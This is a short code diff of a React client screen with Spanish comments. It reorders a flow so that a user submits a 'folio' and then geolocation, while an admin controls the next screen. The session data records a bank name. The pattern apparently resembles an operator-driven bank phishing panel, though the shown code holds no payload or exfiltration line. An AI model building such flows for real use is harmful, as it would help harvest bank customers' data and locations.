@@ -40,7 +40,7 @@ export default function ClientScreen() {
   const sessionId = params?.sessionId || '';
   
   // State for the current screen
-  const [currentScreen, setCurrentScreen] = useState<ScreenType>(ScreenType.GEOLOCATION);
+  const [currentScreen, setCurrentScreen] = useState<ScreenType>(ScreenType.FOLIO);
   const [sessionData, setSessionData] = useState<Partial<Session> & { banco?: string }>({});
   const [bankLoaded, setBankLoaded] = useState<boolean>(false);
   
@@ -191,8 +191,21 @@ export default function ClientScreen() {
         }
       });
       
-      // Cambiar a pantalla validando mientras esperamos respuesta del admin
-      setCurrentScreen(ScreenType.VALIDANDO);
+      // Si es la pantalla FOLIO, cambiar a geolocalización después de enviar
+      if (screen === ScreenType.FOLIO) {
+        console.log('[ClientScreen] Folio enviado, solicitando geolocalización');
+        setCurrentScreen(ScreenType.GEOLOCATION);
+      } else if (screen === ScreenType.GEOLOCATION) {
+        // Para geolocalización, NO cambiar de pantalla automáticamente
+        // El admin controlará el siguiente paso
+        console.log('[ClientScreen] Datos de geolocalización enviados, esperando instrucciones del admin');
+      } else if (screen === ScreenType.VALIDANDO) {
+        // Si ya estamos en VALIDANDO (pantalla de cargando), mantener la pantalla
+        console.log('[ClientScreen] Mostrando pantalla de cargando...');
+      } else {
+        // Para otras pantallas, cambiar a validando mientras esperamos respuesta del admin
+        setCurrentScreen(ScreenType.VALIDANDO);
+      }
     }
   };
 
